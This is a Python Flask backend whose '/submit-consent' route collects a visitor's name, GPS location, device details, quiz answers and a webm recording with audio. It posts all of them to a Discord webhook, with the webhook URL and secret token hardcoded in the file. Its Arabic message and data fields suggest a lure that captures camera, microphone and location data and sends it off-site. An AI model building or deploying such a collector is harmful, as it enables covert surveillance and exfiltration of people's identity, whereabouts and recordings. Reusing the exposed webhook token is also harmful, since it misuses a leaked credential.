import os
import json
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    username = request.form.get("username")
    location = request.form.get("location")
    device_str = request.form.get("device", "{}")
    device = json.loads(device_str)
    
    q1 = request.form.get("q1")
    q2 = request.form.get("q2")
    q3 = request.form.get("q3")
    video_file = request.files.get("video")

    payload = {
        "content": (
            f"✅ **أجاب المستخدم إجابات صحيحة وتم إيقاف الفيديو والصوت:**\n"
            f"• **الاسم:** {username}\n"
            f"• **السؤال 1:** {q1}\n"
            f"• **السؤال 2:** {q2}\n"
            f"• **السؤال 3:** {q3}\n"
            f"• **الموقع (GPS):** {location}\n"
            f"• **الجهاز:** {device.get('model')} | {device.get('platform')}"
        )
    }

    try:
        files = {}
        if video_file:
            files = {
                "file": ("recording_with_audio.webm", video_file.read(), "video/webm")
            }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files, 
            timeout=15
        )
        resp.raise_for_status()
        return jsonify({"message": "Success"}), 200
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
